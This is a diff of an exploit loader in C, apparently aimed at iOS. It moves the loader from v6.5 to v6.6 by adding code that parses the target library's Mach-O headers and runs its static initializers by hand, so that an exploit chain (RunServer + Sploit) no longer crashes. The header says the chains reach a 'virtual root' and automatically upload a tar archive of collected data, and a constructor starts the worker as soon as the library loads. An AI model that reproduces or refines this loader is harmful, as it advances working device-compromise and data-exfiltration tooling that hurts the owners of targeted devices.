@@ -1,17 +1,25 @@
-/* loader89.c - 89yl 双链路加载器 v6.5 (init-timing)
+/* loader89.c - 89yl 双链路加载器 v6.6 (manual-inits)
  * exploit chain: AcqViewCntrlr_ RunServer + Sploit
  * MHA/MCM fallback chain: libuiopsersvc `_mcm_filza_run` -> virtual root
  * Both chains write a real tar archive and auto-upload it.
  * v6.0 fix A: core sink init (0x59fa28) is one-shot per process (atomic guard).
  * v6.0 fix B: direct exploit fallback prefers the GCD main queue (dlsym'd),
  *             pthread only as fallback; parent wait budget 60s @ 250ms.
- * v6.5 init-timing: constructor no longer starts the worker directly.
- *             dlopen issued while dyld is still running initializers leaves
- *             the new image's __mod_init_func unexecuted (34 core
- *             initializers skipped -> global map core+0x6c3800 all-zero ->
- *             Sploit dereferences NULL at core+0x7674; v65_crash_report.md).
- *             The worker launch is deferred to the GCD main queue so dlopen
- *             happens in a normal runloop turn. Logs are flushed per line.
+ * v6.5 init-timing: constructor no longer starts the worker directly; the
+ *             launch is deferred to the GCD main queue (dispatch_async_f).
+ * v6.6 manual-inits: V65 proved dyld NEVER runs the core's 34
+ *             __mod_init_func in this host (constructor timing AND
+ *             main-queue dispatch timing both fail; five crash rounds with
+ *             identical signatures: global map __common core+0x6c3800 stays
+ *             all-zero -> Sploit dereferences NULL at core+0x7674; see
+ *             v65_crash_report.md). The ONLY initializer path proven to work
+ *             on device is a manual call - "v6.0 fix A" calling init[32]
+ *             (core+0x59fa28) succeeded every time. So v6.6 manually runs
+ *             ALL 34 initializers, in __mod_init_func address order, right
+ *             after dlopen and BEFORE any other core call. Dedup: if the
+ *             map begin pointer (core+0x6c3818) is already non-zero the
+ *             inits are considered done (dyld or a previous run) and skipped.
+ *             The constructor now also logs which launch path was taken.
  */
 typedef unsigned long u64;
 typedef long long i64;
@@ -309,6 +317,10 @@ static void read_runtime_config(void) {
 }
 
 static void init_log(void) {
+    /* v6.6: idempotent - the constructor opens the log first so it can log
+     * which launch path it took; the worker's later call is then a no-op
+     * instead of leaking a second fd. */
+    if (g_logfd >= 0) return;
     char *home = getenv("HOME");
     char *p = cat3(home ? home : "/var/mobile", "/Documents/loader89.log", "");
     unsigned long i = 0;
@@ -494,6 +506,152 @@ static int resolve_core_base(void *core, unsigned char **out_base) {
     }
     log_error("core base NOT FOUND in dyld image list");
     return 0;
+}
+
+/* ---------- v6.6 manual-inits: run the core's __mod_init_func by hand ----------
+ *
+ * Root cause of every V6x exploit crash (v65_crash_report.md, five rounds,
+ * identical signatures): dyld never executes the core's 34 __mod_init_func
+ * initializers when libwebuiopsercore is dlopened from this host - neither
+ * from constructor timing nor from main-queue dispatch timing (V65). The
+ * global map in __common (S_ZEROFILL, core+0x6c3800) therefore stays
+ * all-zero and Sploit dereferences NULL at core+0x7674.
+ *
+ * The decisive counter-evidence: the "v6.0 fix A" path, which MANUALLY calls
+ * one of those initializers (init[32] @ core+0x59fa28, the log-sink init),
+ * always worked on device (log: "core sink before vtable=0x0" -> manual
+ * call -> "after vtable=0x1183b2bc8"). Manual invocation is a proven ABI.
+ *
+ * So this function:
+ *   1. resolves the real core image base (resolve_core_base, v4.3);
+ *   2. dedups: if the map begin pointer at core+0x6c3818 is non-zero the
+ *      initializers already ran (dyld or an earlier call) -> skip entirely;
+ *   3. parses the Mach-O load commands (magic 0xfeedfacf little-endian,
+ *      ncmds at offset 16, sizeofcmds at offset 20) and collects every
+ *      LC_SEGMENT_64 (0x19) section named __mod_init_func
+ *      (section_64: addr at header offset 32, size at offset 40, entries
+ *      are 8-byte function pointers; count = size/8, read dynamically,
+ *      not hardcoded to 34);
+ *   4. computes the slide from the lowest segment vmaddr (== base when the
+ *      first __TEXT vmaddr is 0, which the proven base+0x6b96d8-style
+ *      offsets confirm for this core), sorts the sections by address and
+ *      invokes every entry in ascending address order (C++ static ctors
+ *      depend on that order) with the dyld initializer ABI:
+ *          void init(int argc, char **argv, char **envp, char **apple);
+ *      argc/argv come from NXArgc/NXArgv (dlsym), envp from environ
+ *      (libc export). Fallbacks: argc=0, argv = static 4-slot NULL array
+ *      (init[0] @0x6458 writes to [x1,#0x10] i.e. argv[2], so argv must be
+ *      non-NULL with at least 4 writable slots), apple = static NULL array.
+ *   5. logs one line per initializer ("manual init i/N @0x... ok"); a crash
+ *      inside one is then identifiable from the missing successor line.
+ * No exception handling is attempted (C has none); the per-init log lines
+ * are the crash-localization mechanism. stub_core_net_sink / fix A /
+ * resolve_core_base / the exploit state machine are untouched. */
+extern char **environ;
+static char *g_init_null_argv[4] = {0, 0, 0, 0};
+static char *g_init_null_apple[4] = {0, 0, 0, 0};
+
+typedef void (*core_init_fn)(int, char **, char **, char **);
+
+static int manual_run_core_inits(void *core) {
+    if (!core) return 0;
+    unsigned char *base = 0;
+    if (!resolve_core_base(core, &base)) {
+        log_warn("manual core inits SKIPPED (core base not resolved); continue");
+        return 0;
+    }
+    /* dedup / idempotence: map begin pointer non-zero -> inits already ran */
+    if (*(void **)(base + 0x6c3818) != 0) {
+        log_info("core inits already ran (map nonzero)");
+        return 1;
+    }
+    unsigned int magic = *(unsigned int *)(void *)base;
+    if (magic != 0xfeedfacfu) {
+        log_warn("manual core inits SKIPPED (bad Mach-O magic)");
+        return 0;
+    }
+    unsigned int ncmds = *(unsigned int *)(void *)(base + 16);
+    unsigned int sizeofcmds = *(unsigned int *)(void *)(base + 20);
+    unsigned char *p = base + 32;
+    unsigned char *endcmds = base + 32 + sizeofcmds;
+    u64 sec_addr[8], sec_size[8];
+    int nsec = 0;
+    u64 min_vm = ~0ULL, max_vm = 0;
+    for (unsigned int ci = 0; ci < ncmds; ci++) {
+        if (p + 8 > endcmds || p < base) break;
+        unsigned int cmd = *(unsigned int *)(void *)p;
+        unsigned int cmdsize = *(unsigned int *)(void *)(p + 4);
+        if (cmdsize < 8 || p + cmdsize > endcmds) break;
+        if (cmd == 0x19 && cmdsize >= 72) { /* LC_SEGMENT_64 */
+            u64 vmaddr = *(u64 *)(void *)(p + 24);
+            u64 vmsize = *(u64 *)(void *)(p + 32);
+            if (vmaddr < min_vm) min_vm = vmaddr;
+            if (vmaddr + vmsize > max_vm) max_vm = vmaddr + vmsize;
+            unsigned int nsects = *(unsigned int *)(void *)(p + 64);
+            unsigned char *sp = p + 72;
+            for (unsigned int si = 0; si < nsects; si++) {
+                if (sp + 80 > p + cmdsize) break;
+                if (strncmp((const char *)(void *)sp, "__mod_init_func", 15) == 0 && nsec < 8) {
+                    sec_addr[nsec] = *(u64 *)(void *)(sp + 32);
+                    sec_size[nsec] = *(u64 *)(void *)(sp + 40);
+                    nsec++;
+                }
+                sp += 80;
+            }
+        }
+        p += cmdsize;
+    }
+    if (!nsec) { log_warn("manual core inits: no __mod_init_func section found"); return 0; }
+    /* sort sections ascending by address (C++ ctor dependency order) */
+    for (int i = 1; i < nsec; i++) {
+        u64 a = sec_addr[i], s = sec_size[i];
+        int j = i - 1;
+        while (j >= 0 && sec_addr[j] > a) {
+            sec_addr[j + 1] = sec_addr[j];
+            sec_size[j + 1] = sec_size[j];
+            j--;
+        }
+        sec_addr[j + 1] = a;
+        sec_size[j + 1] = s;
+    }
+    u64 slide = (u64)(unsigned long)base - min_vm;
+    unsigned long total = 0;
+    for (int k = 0; k < nsec; k++) total += (unsigned long)(sec_size[k] / 8);
+    if (!total) { log_warn("manual core inits: __mod_init_func size is 0"); return 0; }
+    int *p_argc = (int *)dlsym(RTLD_DEFAULT, "NXArgc");
+    char ***p_argv = (char ***)dlsym(RTLD_DEFAULT, "NXArgv");
+    int argc = p_argc ? *p_argc : 0;
+    char **argv = (p_argv && *p_argv) ? *p_argv : g_init_null_argv;
+    char **envp = environ ? environ : g_init_null_argv;
+    char **apple = g_init_null_apple;
+    char msg[220];
+    snprintf(msg, sizeof(msg), "manual core inits begin: sections=%d total=%lu slide=0x%llx",
+             nsec, total, (unsigned long long)slide);
+    log_info(msg);
+    unsigned long idx = 0;
+    for (int k = 0; k < nsec; k++) {
+        core_init_fn *arr = (core_init_fn *)(void *)(unsigned long)(slide + sec_addr[k]);
+        unsigned long cnt = (unsigned long)(sec_size[k] / 8);
+        for (unsigned long i = 0; i < cnt; i++) {
+            core_init_fn fn = arr[i];
+            if (!fn) { idx++; continue; }
+            u64 fva = (u64)(unsigned long)fn;
+            if (fva < slide + min_vm || fva >= slide + max_vm) {
+                snprintf(msg, sizeof(msg), "manual init %lu/%lu @0x%llx OUT OF RANGE; skipped",
+                         idx, total, (unsigned long long)fva);
+                log_warn(msg);
+                idx++;
+                continue;
+            }
+            fn(argc, argv, envp, apple);
+            snprintf(msg, sizeof(msg), "manual init %lu/%lu @0x%llx ok",
+                     idx, total, (unsigned long long)fva);
+            log_info(msg);
+            idx++;
+        }
+    }
+    log_info("manual core inits done");
+    return 1;
 }
 
 static void repair_core_log_sink(void *core) {
@@ -1208,7 +1366,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v6.5 init-timing start ===");
+    log_info("=== loader89 v6.6 manual-inits start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
@@ -1241,6 +1399,14 @@ static void *worker(void *arg) {
     log_info(mcm ? "dlopen libuiopsersvc OK" : "dlopen libuiopsersvc FAIL");
     log_info(core ? "dlopen core OK" : "dlopen core FAIL");
     log_info(sd ? "dlopen SD OK" : "dlopen SD FAIL");
+    /* v6.6: run ALL 34 core __mod_init_func manually BEFORE any other core
+     * call (InitLogs/RunServer/Sploit/fix-A init[32]). V65 proved dyld does
+     * not run them in this host no matter the dlopen timing; the manual
+     * call path is the only one proven on device (fix A init[32] always
+     * succeeded). Dedup inside: map begin (core+0x6c3818) non-zero -> skip.
+     * fix A below then naturally dedups too: after these inits ran, the
+     * sink vtable is non-zero and repair_core_log_sink only probes it. */
+    manual_run_core_inits(core);
     repair_core_log_sink(core);
     post_log_now();
 
@@ -1516,6 +1682,9 @@ static void deferred_worker_launch(void *ctx) {
 __attribute__((constructor))
 static void loader89_init(void) {
     g_thread_start = (void *)worker;   /* marker for self-check tooling */
+    /* v6.6: open the log here (idempotent) so the chosen launch path is
+     * recorded even if the worker itself never gets to run. */
+    init_log();
     void *(*gmq)(void) = (void *(*)(void))dlsym(RTLD_DEFAULT, "dispatch_get_main_queue");
     void (*dasync)(void *, void *, void (*)(void *)) = 0;
     void *mq = 0;
@@ -1529,10 +1698,12 @@ static void loader89_init(void) {
         }
     }
     if (mq && dasync) {
+        log_info("worker launch via GCD main queue");
         dasync(mq, 0, deferred_worker_launch);
         return;
     }
     /* last resort (pre-v6.5 behavior): plain detached pthread */
+    log_info("GCD unavailable, fallback pthread");
     static void *th;
     if (pthread_create(&th, 0, worker, 0) == 0) pthread_detach(th);
 }
